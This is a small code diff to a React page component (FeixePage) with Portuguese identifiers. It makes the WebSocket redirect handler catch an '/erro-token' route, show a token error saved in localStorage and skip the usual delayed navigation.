@@ -21,9 +21,19 @@ const FeixePage = () => {
   const { send } = useWebSocket({
     reconectarPayload: { dispositivo },
     onRedirect: (msg) => {
+      const route = resolveServerRoute(msg.url);
+      if (route === "/erro-token") {
+        setEnviandoChave(false);
+        const erroSalvo = localStorage.getItem("erroToken");
+        if (erroSalvo) {
+          setErroChave(erroSalvo);
+          localStorage.removeItem("erroToken");
+        }
+        return;
+      }
       setStatus("validando");
       setTimeout(() => {
-        navigate(resolveServerRoute(msg.url));
+        navigate(route);
       }, 1500);
     },
     onMessage: (msg) => {
